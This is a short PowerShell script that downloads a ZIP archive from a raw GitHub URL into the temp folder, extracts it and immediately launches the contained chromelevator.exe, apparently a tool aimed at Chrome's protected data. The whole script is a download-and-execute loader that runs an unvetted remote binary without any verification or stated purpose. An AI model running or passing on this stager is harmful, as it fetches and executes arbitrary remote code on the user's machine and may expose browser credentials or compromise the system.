# Paths
$zipUrl  = "https://raw.githubusercontent.com/np4abdou1/testapi/refs/heads/main/s.zip"
$zipFile = "$env:TEMP\s.zip"
$extractDir = "$env:TEMP\s_extracted"

# Make sure extract folder exists
if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
New-Item -ItemType Directory -Path $extractDir | Out-Null

# Download ZIP
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile

# Extract ZIP
Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force

# Run chromelevator.exe
$exe = Join-Path $extractDir "chromelevator.exe"
Start-Process $exe
